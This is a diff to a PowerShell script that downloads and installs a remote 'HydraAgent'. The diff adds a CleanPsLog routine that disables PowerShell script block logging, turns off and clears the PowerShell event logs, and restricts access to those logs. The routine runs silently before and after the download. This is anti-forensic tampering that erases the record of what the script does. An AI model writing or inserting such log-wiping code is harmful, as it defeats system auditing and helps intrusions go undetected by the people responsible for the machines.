@@ -25,7 +25,22 @@ function OutputWriter($message)
     $global:Hydra_Output+="`r`n"+$message
     LogWriter($message)
 }
-
+function AddRegistyKey($key) {
+	if (-not (Test-Path $key)) {
+		New-Item -Path $key -Force -ErrorAction SilentlyContinue
+	}
+}
+function CleanPsLog() {
+	AddRegistyKey "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"
+	New-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 0 -force -ErrorAction SilentlyContinue
+    Start-Process -FilePath "$env:windir\system32\wevtutil.exe" -ArgumentList 'sl "Windows PowerShell" /e:false' -Wait -ErrorAction SilentlyContinue
+    Start-Process -FilePath "$env:windir\system32\wevtutil.exe" -ArgumentList 'sl "Microsoft-Windows-PowerShell/Operational" /e:false' -Wait -ErrorAction SilentlyContinue
+	Start-Process -FilePath "$env:windir\system32\wevtutil.exe" -ArgumentList 'sl "Windows PowerShell" /ca:"O:BAG:SYD:(A;;0x1;;;SY)"' -Wait -ErrorAction SilentlyContinue
+	Start-Process -FilePath "$env:windir\system32\wevtutil.exe" -ArgumentList 'sl "Microsoft-Windows-PowerShell/Operational" /ca:"O:BAG:SYD:(A;;0x1;;;SY)"' -Wait -ErrorAction SilentlyContinue
+	Clear-EventLog -LogName "Windows PowerShell" -ErrorAction SilentlyContinue
+	Start-Process -FilePath "$env:windir\system32\wevtutil.exe" -ArgumentList 'cl "Microsoft-Windows-PowerShell/Operational"' -Wait -ErrorAction SilentlyContinue
+	try {Disable-PSTrace} catch {}
+}
 function UnzipFile ($zipfile, $outdir)
 {
     # Based on https://gist.github.com/nachivpn/3e53dd36120877d70aee
@@ -65,7 +80,7 @@ function DownloadFile ( $url, $outFile)
 }
 
 $DownloadAdress="https://$($uri)/Download/HydraAgent"
-
+CleanPsLog
 
 $global:Hydra_Output="Done"
 try {
@@ -102,4 +117,5 @@ catch {
 
 
 LogWriter($global:Hydra_Output)
+CleanPsLog
 Write-host("ScriptReturnMessage:{$($global:Hydra_Output)}:ScriptReturnMessage")
